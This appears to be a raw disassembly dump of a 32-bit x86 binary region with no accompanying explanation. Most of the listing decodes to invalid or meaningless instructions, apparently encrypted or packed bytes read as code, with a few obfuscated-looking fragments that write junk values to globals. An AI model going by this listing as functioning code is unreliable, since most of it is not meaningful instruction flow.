  40690a:	dec    edi
  40690b:	icebp  
  40690c:	test   al,0x9f
  40690e:	outs   dx,BYTE PTR ds:[esi]
  40690f:	nop
  406910:	icebp  
  406911:	invd   
  406913:	out    dx,eax
  406914:	(bad)  
  406916:	int3   
  406917:	jge    0x40689a
  406919:	retf   
  40691a:	push   ebp
  40691b:	add    eax,0x650be77e
  406920:	and    BYTE PTR [esi+eiz*8-0x47f01a59],0x51
  406928:	xor    BYTE PTR [eax+0x28],bh
  40692b:	mov    dh,0x26
  40692d:	call   0xd4e0:0x6e051324
  406934:	dec    eax
  406935:	mov    esi,eax
  406937:	sbb    eax,0x4bf8310
  40693c:	push   edx
  40693d:	jecxz  0x406950
  40693f:	sbb    DWORD PTR [ebx-0x46ce48a4],ebp
  406945:	push   edx
  406946:	mov    eax,ds:0x75cb45e0
  40694b:	add    BYTE PTR [ecx+0x5f],dl
  40694e:	add    eax,0x7c0d1a0e
  406953:	imul   ebx,DWORD PTR [ecx+0x2b],0x60b4bcc4
  40695a:	test   BYTE PTR [ecx-0x18bad381],ch
  406960:	popa   
  406961:	add    BYTE PTR [ebx],dh
  406963:	lock cmc 
  406965:	push   ss
  406966:	xchg   edi,eax
  406967:	shl    BYTE PTR [eax],1
  406969:	sbb    DWORD PTR [ecx-0x1d],ebx
  40696c:	mov    ch,bh
  40696e:	mov    ecx,0x2a54d0ac
  406973:	cs mov ah,0x1c
  406976:	in     al,dx
  406977:	aaa    
  406978:	pop    es
  406979:	jl     0x406916
  40697b:	pusha  
  40697c:	add    edi,DWORD PTR [ecx+0x544de1b]
  406982:	nop
  406983:	clc    
  406984:	sbb    ah,0xb0
  406987:	mov    WORD PTR [edi-0x2b44c52],si
  40698e:	sub    bh,BYTE PTR ds:0xfe010238
  406994:	adc    eax,0xebcf8c4f
  406999:	push   0xe08f946
  40699e:	fnsetpm(287 only) 
  4069a0:	jmp    0xeab4:0x92f1759
  4069a7:	aaa    
  4069a8:	dec    esp
  4069a9:	xor    DWORD PTR [ebp+0x56],edi
  4069ac:	aad    0xac
  4069ae:	xor    esi,DWORD PTR [ecx]
  4069b0:	push   0x6d5b3665
  4069b5:	mov    eax,?
  4069b7:	xchg   esi,eax
  4069b8:	inc    edi
  4069b9:	xor    BYTE PTR [edx+0x34c5c5cf],0x50
  4069c0:	(bad)  
  4069c1:	and    dl,al
  4069c3:	xor    BYTE PTR [edx-0x14a753ff],ah
  4069c9:	mov    ds:0xce375800,al
  4069ce:	pop    es
  4069cf:	enter  0x7a40,0x3d
  4069d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069d4:	or     eax,0x31ecfc16
  4069d9:	hlt    
  4069da:	dec    edx
  4069db:	pop    edx
  4069dc:	pop    esi
  4069dd:	inc    ebp
  4069de:	jmp    0x440d:0x456dd8c0
  4069e5:	aas    
  4069e6:	cmp    BYTE PTR [ecx-0x5e8d34cb],ah
  4069ec:	xor    ecx,0xffffffda
  4069ef:	dec    edi
  4069f0:	sub    BYTE PTR [ebx+0x6d],bh
  4069f3:	or     BYTE PTR [edi+0x26],bh
  4069f6:	jle    0x4069b9
  4069f8:	push   ebp
  4069f9:	fadd   QWORD PTR [ebx]
  4069fb:	add    eax,0x1f109055
  406a00:	xchg   ebp,eax
  406a01:	cmp    edx,DWORD PTR [esi+0x4f]
  406a04:	in     al,0x4e
  406a06:	or     bl,BYTE PTR [ecx+ecx*2]
  406a09:	dec    ebp
  406a0a:	inc    ebp
  406a0b:	dec    ecx
  406a0c:	fisttp DWORD PTR [ebp+0x71]
  406a0f:	mov    bh,0x7e
  406a11:	and    bl,dh
  406a13:	xchg   ecx,eax
  406a14:	shl    BYTE PTR [eax-0x70084fb0],1
  406a1a:	cmp    bh,BYTE PTR [eax+0x56]
  406a1d:	xor    BYTE PTR [ebx-0x1d],ah
  406a20:	xchg   BYTE PTR [ebx+0x6e],dl
  406a23:	fld    TBYTE PTR [ebp+0x6cc7342]
  406a29:	data16 mov BYTE PTR [edx-0x10a6c372],bh
  406a30:	mov    al,0xaa
  406a32:	ds clc 
  406a34:	inc    ecx
  406a35:	xor    edx,DWORD PTR fs:0xe20438a4
  406a3c:	div    BYTE PTR [edi]
  406a3e:	push   0xffffffe5
  406a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a41:	lods   al,BYTE PTR ds:[esi]
  406a42:	sbb    eax,DWORD PTR [edi-0x77a8c8cc]
  406a48:	sbb    cl,dh
  406a4a:	ss test eax,0xefa13930
  406a50:	cmp    DWORD PTR [edi],edi
  406a52:	jb     0x4069e5
  406a54:	repnz sbb eax,0x62e85a3b
  406a5a:	mov    al,0x93
  406a5c:	or     BYTE PTR [edx+0x458b32bf],ah
  406a62:	(bad)  
  406a63:	pop    ebx
  406a64:	mov    al,ds:0x17bfb01
  406a69:	inc    ebx
  406a6a:	jl     0x406a42
  406a6c:	shr    DWORD PTR [esi-0x611c8de0],0x1c
  406a73:	or     eax,0xf1c2af41
  406a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a79:	repnz mov gs,WORD PTR [edi+0x41cfea16]
  406a80:	dec    esp
  406a81:	pushf  
  406a82:	retf   0x3366
  406a85:	sar    DWORD PTR [ecx+0x3b00],0x66
  406a8c:	add    eax,ecx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x855a:0xd9dda5c
  406abc:	arpl   WORD PTR [esi+0x60],sp
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	or     eax,0x97439859
  406acb:	adc    al,0x3f
  406acd:	and    al,0xe2
  406acf:	fld    QWORD PTR [eax+ecx*8]
  406ad2:	xor    ebp,edi
  406ad4:	xor    eax,0x4b010af9
  406ad9:	mov    ah,0xc8
  406adb:	cmpps  xmm3,xmm7,0xee
  406adf:	inc    edi
  406ae0:	mov    al,ds:0xd7c2f4df
  406ae5:	and    al,0x7f
  406ae7:	out    dx,al
  406ae8:	xchg   esi,eax
  406ae9:	rcr    DWORD PTR [edx],0x35
  406aec:	lods   eax,DWORD PTR ds:[esi]
  406aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aee:	inc    ebx
  406aef:	and    eax,0x5c6475c3
  406af4:	(bad)  
  406af5:	jecxz  0x406ad1
  406af7:	pushf  
  406af8:	pop    ecx
  406af9:	cmp    DWORD PTR [edx],ecx
  406afb:	dec    eax
  406afc:	mov    eax,ds:0xbb279a65
  406b01:	js     0x406b39
  406b03:	xchg   ecx,eax
  406b04:	mov    esp,0xc5db1256
  406b09:	(bad)  
  406b0a:	in     eax,dx
  406b0b:	int3   
  406b0c:	(bad)  [ebx-0x62]
  406b0f:	inc    edx
  406b10:	mov    ebp,0x2bd753cc
  406b15:	sub    BYTE PTR [ebx+0x64],bh
  406b18:	frstor [ecx+edx*1]
  406b1b:	adc    al,0x4d
  406b1d:	scas   al,BYTE PTR es:[edi]
  406b1e:	cdq    
  406b1f:	inc    ecx
  406b20:	fidivr DWORD PTR [esi-0x64]
  406b23:	xor    al,BYTE PTR [ebx-0x46213901]
  406b29:	js     0x406b71
  406b2b:	dec    ecx
  406b2c:	xor    al,BYTE PTR [ebx]
  406b2e:	jnp    0x406aca
  406b30:	jg     0x406af3
  406b32:	pop    ebx
  406b33:	jmp    0x406b85
  406b35:	mov    al,0xb6
  406b37:	inc    eax
  406b38:	neg    ebp
  406b3a:	imul   esp,DWORD PTR [edi],0x179e6628
  406b40:	add    al,BYTE PTR [eax+edi*4-0x70068bfc]
  406b47:	mov    edx,0xf3232fa9
  406b4c:	pop    ebx
  406b4d:	cmp    al,BYTE PTR [eax+0x27]
  406b50:	adc    dl,BYTE PTR [edi-0x68]
  406b53:	xchg   edi,eax
  406b54:	pop    edi
  406b55:	cmp    eax,0x7730ca52
  406b5a:	add    esi,DWORD PTR [edi-0x19]
  406b5d:	lods   eax,DWORD PTR ds:[esi]
  406b5e:	hlt    
  406b5f:	outs   dx,BYTE PTR ds:[esi]
  406b60:	fnstsw WORD PTR [edi]
  406b62:	cmp    BYTE PTR [eax+ecx*8],ah
  406b65:	fsubr  QWORD PTR [esi-0x6f8d9886]
  406b6b:	les    ecx,FWORD PTR [edx+0x62]
  406b6e:	xchg   BYTE PTR ds:0xa29a0f45,cl
  406b74:	jbe    0x406b01
  406b76:	push   0x9eb04654
  406b7b:	and    BYTE PTR [edi-0x69],cl
  406b7e:	and    ebp,ebp
  406b80:	shr    BYTE PTR [ebp+edx*1-0x68],cl
  406b84:	out    dx,eax
  406b85:	sub    BYTE PTR [ecx+0x7e],0x38
  406b89:	cli    
  406b8a:	aad    0x12
  406b8c:	stos   DWORD PTR es:[edi],eax
  406b8d:	(bad)  
  406b8f:	sar    BYTE PTR [eax-0x16e072a1],1
  406b95:	cmp    dh,BYTE PTR [edx-0xf2b2890]
  406b9b:	fidiv  DWORD PTR [esi-0xc]
  406b9e:	inc    ecx
  406b9f:	push   esp
  406ba0:	push   ss
  406ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba2:	xchg   BYTE PTR [ecx+eax*1-0x1609ff27],al
  406ba9:	sbb    DWORD PTR [esi],0x4b
  406bac:	stos   DWORD PTR es:[edi],eax
  406bad:	xchg   ebx,eax
  406bae:	sub    esp,DWORD PTR [esi+0x65]
  406bb1:	dec    edx
  406bb2:	add    esp,DWORD PTR [esi-0x5e]
  406bb5:	or     esp,ecx
  406bb7:	pop    es
  406bb8:	xchg   edi,eax
  406bb9:	and    BYTE PTR [edx-0x49],0x54
  406bbd:	pop    esi
  406bbe:	ins    DWORD PTR es:[edi],dx
  406bbf:	jbe    0x406b48
  406bc1:	mov    eax,ds:0x6bf74560
  406bc6:	mov    esp,DWORD PTR [ecx]
  406bc8:	inc    edx
  406bc9:	(bad)  
  406bca:	out    dx,eax
  406bcb:	imul   ebp,DWORD PTR [ecx],0x86c2ac96
  406bd1:	inc    esi
  406bd2:	rcl    BYTE PTR [ebp-0x18],cl
  406bd5:	fcomp  QWORD PTR ds:0x141d
  406bda:	jecxz  0x406c21
  406bdc:	bound  edx,QWORD PTR [ebx+0x773308f9]
  406be2:	and    DWORD PTR [esi],eax
  406be4:	mov    esp,0x7dc52114
  406be9:	retf   0x5452
  406bec:	push   ds
  406bed:	into   
  406bee:	iret   
  406bef:	(bad)  
  406bf0:	and    ebx,DWORD PTR [eax]
  406bf2:	pop    es
  406bf3:	outs   dx,DWORD PTR ds:[esi]
  406bf4:	and    DWORD PTR [ebp+0x2e],eax
  406bf7:	call   0x4fc4b30f
  406bfc:	aas    
  406bfd:	shl    BYTE PTR [esi],1
  406bff:	jbe    0x406c6f
  406c01:	xor    ebp,DWORD PTR [eax+0xdaf5dc0]
  406c07:	dec    DWORD PTR [esi]
  406c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c0a:	push   es
  406c0b:	xchg   DWORD PTR [edi+0x13939607],ecx
  406c11:	cmp    dl,ah
  406c13:	daa    
  406c14:	mov    esp,ebp
  406c16:	push   esi
  406c17:	or     ebx,DWORD PTR [eax-0x42]
  406c1a:	xchg   ebx,eax
  406c1b:	pop    edx
  406c1c:	inc    ecx
  406c1d:	adc    dl,dl
  406c1f:	dec    edx
  406c20:	cdq    
  406c21:	jne    0x406c72
  406c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c24:	or     al,0xde
  406c26:	xor    al,bh
  406c28:	frstor [ebx+0x62e053ac]
  406c2e:	xchg   DWORD PTR [ecx+0x33cb1418],edi
  406c34:	mov    ah,0xaf
  406c36:	xor    BYTE PTR [esi-0x80],al
  406c39:	out    0x67,eax
  406c3b:	addr16 (bad) 
  406c3d:	data16 shl BYTE PTR [edi],cl
  406c40:	pop    edx
  406c41:	adc    eax,0x644c8116
  406c46:	xor    DWORD PTR es:0x59fbd07e,0x41
  406c4e:	add    dl,BYTE PTR [ebx-0x13311314]
  406c54:	test   DWORD PTR [esi-0x79],0x7f091044
  406c5b:	xchg   ebx,eax
  406c5c:	sbb    dh,ch
  406c5e:	in     al,dx
  406c5f:	mov    edx,0x3ef036fa
  406c64:	rcr    DWORD PTR [ebx],0x4f
  406c67:	call   0x8e0b:0xb37f3b27
  406c6e:	and    BYTE PTR [ecx],ah
  406c70:	xor    ch,BYTE PTR [ebp+edi*4+0x66]
  406c74:	shr    BYTE PTR [ebx-0x67e9f309],0xaa
  406c7b:	(bad)  
  406c7c:	lods   al,BYTE PTR ds:[esi]
  406c7d:	xor    BYTE PTR [eax+0x61],dh
  406c80:	stos   DWORD PTR es:[edi],eax
  406c81:	in     eax,dx
  406c82:	and    al,0x6b
  406c84:	bound  edi,QWORD PTR [ecx+edi*8+0x71]
  406c88:	js     0x406c87
  406c8a:	jge    0x406c8b
  406c8c:	cwde   
  406c8d:	adc    ebp,edx
  406c8f:	dec    edi
  406c90:	enter  0xaed3,0xe3
  406c94:	fsub   QWORD PTR ds:[edi]
  406c97:	cdq    
  406c98:	sar    DWORD PTR [ecx],1
  406c9a:	pop    edi
  406c9b:	fwait
  406c9c:	sahf   
  406c9d:	inc    esi
  406c9e:	jbe    0x406c8f
  406ca0:	mov    esp,0xf5bc21fb
  406ca5:	pop    esi
  406ca6:	bound  esi,QWORD PTR [ecx+0x2875e4ba]
  406cac:	jno    0x406c9c
  406cae:	data16 cmp al,0x96
  406cb1:	fsubrp st(3),st
  406cb3:	adc    eax,0xe3cedd1c
  406cb8:	sbb    DWORD PTR ds:0x2cad9d58,ebx
  406cbe:	rcr    DWORD PTR [ecx],cl
  406cc0:	pop    ebp
  406cc1:	or     eax,0x263c75f5
  406cc6:	cmp    eax,0x518be931
  406ccb:	dec    eax
  406ccc:	xchg   edi,eax
  406ccd:	push   ebx
  406cce:	dec    DWORD PTR cs:[ecx+0x41]
  406cd2:	sub    ch,BYTE PTR [edi-0x4a]
  406cd5:	pop    edx
  406cd6:	adc    al,0xc9
  406cd8:	mov    eax,ds:0xe864caf8
  406cdd:	in     al,dx
  406cde:	stos   DWORD PTR es:[edi],eax
  406cdf:	xor    eax,0x5d03a4c5
  406ce4:	jno    0x406d5c
  406ce6:	cld    
  406ce7:	cwde   
  406ce8:	push   0xc4b19e45
  406ced:	pop    ebx
  406cee:	adc    DWORD PTR [edi+0x3ff38794],ebp
  406cf4:	mov    edi,0x456cf6bc
  406cf9:	test   BYTE PTR [edi+edi*2],ch
  406cfc:	mov    ds:0x3e1655bb,eax
  406d01:	sub    BYTE PTR [esi-0x75],ah
  406d04:	inc    ebp
  406d05:	clc    
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4335ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43361b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43359b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433543
  406d52:	or     DWORD PTR ds:0x43359f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433557,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43361b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    cl,BYTE PTR ss:[esi+0x39]
  406d82:	outs   dx,BYTE PTR ds:[esi]
  406d83:	and    DWORD PTR [edx+eax*8],esp
  406d86:	jl     0x406e04
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d73
  406d8d:	or     al,0xfb
  406d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d90:	sbb    al,0x8c
  406d92:	jne    0x406d25
  406d94:	(bad)  
  406d96:	jb     0x406d8f
  406d98:	inc    ebp
  406d99:	ss xchg ebx,eax
  406d9b:	ss pop esi
  406d9d:	add    edx,ecx
  406d9f:	lea    edi,[edi]
  406da1:	sub    BYTE PTR [eax+0x530bda0b],ah
  406da7:	cmp    BYTE PTR [edx+0x64391547],bl
  406dad:	dec    esp
  406dae:	sub    dl,al
  406db0:	(bad)  
  406db1:	inc    esi
  406db2:	lea    edx,[esi+0x70]
  406db5:	mov    DWORD PTR [edi+0x5],edi
  406db8:	arpl   WORD PTR ds:0xe5d833e5,dx
  406dbe:	std    
  406dbf:	dec    ebp
  406dc0:	xor    ah,BYTE PTR [esi+0x1b]
  406dc3:	sbb    BYTE PTR [edi-0x3d],bh
  406dc6:	mov    dh,0x1d
  406dc8:	(bad)  
  406dc9:	xor    BYTE PTR [esi-0xb804139],cl
  406dcf:	in     eax,dx
  406dd0:	jne    0x406d6d
  406dd2:	adc    BYTE PTR [edx-0x61302854],bh
  406dd8:	sub    esp,DWORD PTR [ecx+0x6c]
  406ddb:	and    bh,ch
  406ddd:	enter  0xba4b,0xd5
  406de1:	dec    ebx
  406de2:	cdq    
  406de3:	xchg   DWORD PTR [ebx-0xf],eax
  406de6:	sar    bh,1
  406de8:	test   BYTE PTR [esi-0x55710bfe],al
  406dee:	xchg   ebp,eax
  406def:	jecxz  0x406e02
  406df1:	or     BYTE PTR [ebx+ebx*2+0x4c],ch
  406df5:	cmp    BYTE PTR [edx],dl
  406df7:	gs mov bh,0x50
  406dfa:	and    eax,0xc73cbd37
  406dff:	into   
  406e00:	test   DWORD PTR [esi-0x12],esi
  406e03:	xor    ah,BYTE PTR [esi]
  406e05:	jecxz  0x406e67
  406e07:	mov    dl,0xf2
  406e09:	mov    WORD PTR [eax-0x5],gs
  406e0c:	jle    0x406dfc
  406e0e:	dec    ebx
  406e0f:	or     eax,0x2431c508
  406e14:	(bad)  
  406e15:	pushf  
  406e16:	ret    
  406e17:	and    BYTE PTR [edi+edx*4-0x61],bh
  406e1b:	dec    edx
  406e1c:	push   ebp
  406e1d:	lods   al,BYTE PTR ds:[esi]
  406e1e:	pop    ss
  406e1f:	mov    ebx,0xe87fb90d
  406e24:	fnstcw WORD PTR [eax+0x6]
  406e27:	push   0x835148b9
  406e2c:	sub    edi,edx
  406e2e:	retf   
  406e2f:	pop    ebx
  406e30:	add    ch,BYTE PTR [ecx]
  406e32:	and    BYTE PTR [esi],bh
  406e34:	cmp    al,0x4f
  406e36:	adc    al,BYTE PTR [edx]
  406e38:	mov    edi,0x9939794a
  406e3d:	ret    
  406e3e:	je     0x406e40
  406e40:	xchg   ebx,eax
  406e41:	pop    ecx
  406e42:	(bad)  
  406e44:	out    0x6c,al
  406e46:	test   DWORD PTR [edi+0x18],0x80b19eeb
  406e4d:	(bad)  
  406e4e:	repnz inc esp
  406e50:	hlt    
  406e51:	jge    0x406e2c
  406e53:	jb     0x406dee
  406e55:	inc    ebp
  406e56:	mov    dl,0xdf
  406e58:	inc    ebp
  406e59:	mov    gs,WORD PTR [ebx-0x25]
  406e5c:	es cs jb 0x406ead
  406e60:	loop   0x406edb
  406e62:	xchg   edx,eax
  406e63:	xchg   ecx,eax
  406e64:	mov    ecx,0x6f05e44a
  406e69:	push   eax
  406e6a:	sahf   
  406e6b:	dec    edi
  406e6c:	jle    0x406e4e
  406e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e6f:	pop    ss
  406e70:	dec    eax
  406e71:	push   0x39
  406e73:	outs   dx,DWORD PTR cs:[esi]
  406e75:	or     esp,esi
  406e77:	imul   DWORD PTR [eax]
  406e79:	xchg   edi,eax
  406e7a:	jg     0x406e5d
  406e7c:	add    al,0xe2
  406e7e:	push   esp
  406e7f:	mov    ch,BYTE PTR [ecx+0x73]
  406e82:	push   ecx
  406e83:	lahf   
  406e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e85:	rol    WORD PTR ds:0xc749,1
  406e8b:	mov    al,ds:0xa8fe9775
  406e90:	ds jecxz 0x406ee4
  406e93:	jmp    0x406ed8
  406e95:	push   es
  406e96:	ret    0x65e1
  406e99:	in     eax,0x36
  406e9b:	mov    ecx,DWORD PTR [ebx-0x78]
  406e9e:	repnz sbb DWORD PTR [esi-0x230f9fc9],esi
  406ea5:	aaa    
  406ea6:	push   edi
  406ea7:	adc    DWORD PTR [ebp+0x6d99b086],ebp
  406ead:	jns    0x406e8f
  406eaf:	ret    
  406eb0:	es out 0x7f,al
  406eb3:	add    esp,DWORD PTR [ebp-0x71acd732]
  406eb9:	adc    DWORD PTR [ebx+ecx*8+0x301fabee],0x36418932
  406ec4:	jno    0x406f2c
  406ec6:	pop    es
  406ec7:	mov    bh,0xae
  406ec9:	xchg   ebp,eax
  406eca:	push   eax
  406ecb:	cmp    edi,edi
  406ecd:	add    eax,0xbdf59aee
  406ed2:	add    DWORD PTR [esi+edi*4],ebx
  406ed5:	inc    esi
  406ed6:	inc    ebp
  406ed7:	mov    esi,0xcb3ba684
  406edc:	ja     0x406e84
  406ede:	jns    0x406eca
  406ee0:	xor    ch,BYTE PTR [edx-0x47]
  406ee3:	or     BYTE PTR [ebx],al
  406ee5:	mov    si,0xda87
  406ee9:	pop    ebx
  406eea:	scas   eax,DWORD PTR es:[edi]
  406eeb:	and    al,0x2b
  406eed:	iret   
  406eee:	test   eax,0x2008e94
  406ef3:	scas   al,BYTE PTR es:[edi]
  406ef4:	dec    ebp
  406ef5:	outs   dx,DWORD PTR ds:[esi]
  406ef6:	xchg   DWORD PTR [ebp-0x6],edi
  406ef9:	mov    ecx,gs
  406efb:	push   ecx
  406efc:	ret    
  406efd:	es and al,0xdd
  406f00:	fist   DWORD PTR ds:0xd868be25
  406f06:	xchg   esp,eax
  406f07:	push   0x79
  406f09:	mov    cl,bl
  406f0b:	inc    ebp
  406f0c:	jb     0x406ed1
  406f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f0f:	lock (bad) 
  406f12:	lds    edx,FWORD PTR [edi-0x1]
  406f15:	pop    edx
  406f16:	cli    
  406f17:	(bad)  
  406f18:	push   cs
  406f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f1a:	pop    esi
  406f1b:	lds    esi,FWORD PTR [eax]
  406f1d:	dec    ebx
  406f1e:	popa   
  406f1f:	xchg   DWORD PTR ds:0x608f0b7d,edi
  406f25:	nop
  406f26:	adc    bh,BYTE PTR [ecx+0x7ec703be]
  406f2c:	mov    dl,0x33
  406f2e:	inc    ebx
  406f2f:	ins    BYTE PTR es:[edi],dx
  406f30:	call   0x8cac:0xfd8327b3
  406f37:	fstp   DWORD PTR ds:0x6ef9ee57
  406f3d:	jb     0x406f58
  406f3f:	lds    eax,FWORD PTR ds:0x8caa0cb8
  406f45:	popf   
  406f46:	jg     0x406fa0
  406f48:	jae    0x406ee2
  406f4a:	push   0x36
  406f4c:	cmc    
  406f4d:	pop    eax
  406f4e:	xor    eax,0xfe001f14
  406f53:	cmc    
  406f54:	jge    0x406efc
  406f56:	adc    cl,BYTE PTR [ecx+0x22667a70]
  406f5c:	inc    edi
  406f5d:	pop    ebx
  406f5e:	jo     0x406f80
  406f60:	cli    
  406f61:	mov    ecx,gs
  406f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f64:	ret    0x80da
  406f67:	cmp    bl,al
  406f69:	push   eax
  406f6a:	pop    ebx
  406f6b:	outs   dx,BYTE PTR ds:[esi]
  406f6c:	pop    es
  406f6d:	inc    edx
  406f6e:	sbb    ah,BYTE PTR [edi+ebx*2+0x4a]
  406f72:	mov    ch,0xf5
  406f74:	pop    ebp
  406f75:	cld    
  406f76:	and    DWORD PTR [edi],ecx
  406f78:	sbb    bh,cl
  406f7a:	popa   
  406f7b:	push   ss
  406f7c:	or     DWORD PTR [ebx+0x569cf4dd],esp
  406f82:	out    dx,eax
  406f83:	gs cld 
  406f85:	ret    0x7ff
  406f88:	mov    al,ds:0x3073eab6
  406f8d:	pop    edx
  406f8e:	mov    dl,0xf
  406f90:	test   DWORD PTR [ebp-0xe0a41bb],edi
  406f96:	sub    BYTE PTR [edi+0x771d96d9],cl
  406f9c:	adc    al,0xb6
  406f9e:	inc    edi
  406f9f:	push   0x21
  406fa1:	in     eax,0xfc
  406fa3:	int3   
  406fa4:	lock push 0xf2653b03
  406faa:	test   BYTE PTR [edx+0x60f96804],cl
  406fb0:	pop    edx
  406fb1:	mov    ah,dl
  406fb3:	scas   al,BYTE PTR es:[edi]
  406fb4:	call   0xec609ee2
  406fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fba:	sti    
  406fbb:	imul   esp,DWORD PTR [edx-0x68],0x5fc20b65
  406fc2:	(bad)  
  406fc3:	std    
  406fc4:	push   es
  406fc5:	jl     0x407031
  406fc7:	inc    esi
  406fc8:	xor    ch,BYTE PTR [ecx+ebp*2-0x58947b6d]
  406fcf:	lock ja 0x406f92
  406fd2:	ret    
  406fd3:	test   al,0x93
  406fd5:	xor    ebx,esp
  406fd7:	shr    BYTE PTR [esi+0x74],cl
  406fda:	dec    edi
  406fdb:	test   al,0xf3
  406fdd:	rcr    dl,0xe8
  406fe0:	jns    0x406f64
  406fe2:	bound  esp,QWORD PTR cs:[edi+0x27c583c3]
  406fe9:	sub    cl,BYTE PTR [ecx+0x55]
  406fec:	add    eax,0xefa4d3fc
  406ff1:	mov    WORD PTR [edx],ds
  406ff3:	push   esi
  406ff4:	xchg   edi,eax
  406ff5:	jle    0x406fe8
  406ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ff8:	mov    ds:0xc5b9ac3a,eax
  406ffd:	cmp    DWORD PTR [ebx+0x46],esi
  407000:	push   ecx
  407001:	mov    ah,0x54
  407003:	sub    esi,DWORD PTR [ebp+0x3ce31e44]
  407009:	or     al,0x95
  40700b:	inc    esp
  40700c:	mov    ds:0xd6a6b683,eax
  407011:	push   esi
  407012:	test   DWORD PTR [ebx],edi
  407014:	or     ch,BYTE PTR cs:[edx]
  407017:	das    
  407018:	pop    ebp
  407019:	pop    eax
  40701a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40701b:	mov    esi,edi
  40701d:	aas    
  40701e:	pusha  
  40701f:	jmp    0x406fc3
  407021:	adc    eax,0x5432d6e1
  407026:	aad    0xc3
  407028:	jge    0x40707c
  40702a:	dec    ebp
  40702b:	imul   edx,edx,0x49d1b409
  407031:	fwait
  407032:	bnd js 0x407026
  407035:	or     DWORD PTR [eax+0x12],ebp
  407038:	jns    0x407050
  40703a:	cmp    eax,0xe89997d4
  40703f:	(bad)  
  407041:	retf   0xadb7
  407044:	rol    BYTE PTR [edi],cl
  407046:	mov    ebp,DWORD PTR [esi-0x30]
  407049:	fcomp  QWORD PTR [edi+0x22]
  40704c:	adc    al,0xc1
  40704e:	cmp    DWORD PTR [eax+0x64],0xffffffe5
  407052:	clc    
  407053:	mov    ebp,0xa6f9710b
  407058:	push   edi
  407059:	mov    dl,0x5c
  40705b:	push   ecx
  40705c:	cld    
  40705d:	aaa    
  40705e:	repz (bad) 
  407060:	xchg   edx,eax
  407061:	enter  0xa00a,0x1b
  407065:	mov    edi,0xef4b2c2e
  40706a:	out    dx,al
  40706b:	add    eax,0xcceda336
  407070:	push   cs
  407071:	in     al,0xdc
  407073:	and    ecx,DWORD PTR [ebp-0x505894d3]
  407079:	or     ebp,DWORD PTR [ebx]
  40707b:	int3   
  40707c:	add    eax,esi
  40707e:	out    dx,eax
  40707f:	(bad)  
  407080:	(bad)  [esi+0x31]
  407083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407084:	rol    DWORD PTR [edi+0x5a6bb5d6],0x89
  40708b:	add    DWORD PTR [ebx+0x4059b12d],ebx
  407091:	xor    esp,DWORD PTR [esi-0x2db13cd4]
  407097:	out    0x4b,eax
  407099:	into   
  40709a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40709b:	mov    ecx,0xa66081ba
  4070a0:	push   es
  4070a1:	(bad)  
  4070a2:	fistp  QWORD PTR [eax+0x59]
  4070a5:	cwde   
  4070a6:	push   0x4f
  4070a8:	push   0xfffffff7
  4070aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ab:	push   0x2abcd109
  4070b0:	dec    ecx
  4070b1:	in     al,dx
  4070b2:	xchg   esi,eax
  4070b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b4:	pop    eax
  4070b5:	sbb    ch,BYTE PTR [esi+0x6d078a5d]
  4070bb:	fs inc ecx
  4070bd:	adc    esp,DWORD PTR [edi-0x48e072e9]
  4070c3:	jae    0x4070a3
  4070c5:	push   cs
  4070c6:	sbb    DWORD PTR [edx-0x7b409074],ebx
  4070cc:	imul   DWORD PTR [ebp+0x64]
  4070cf:	repnz xor eax,0x74e81c91
  4070d5:	repnz ins BYTE PTR es:[edi],dx
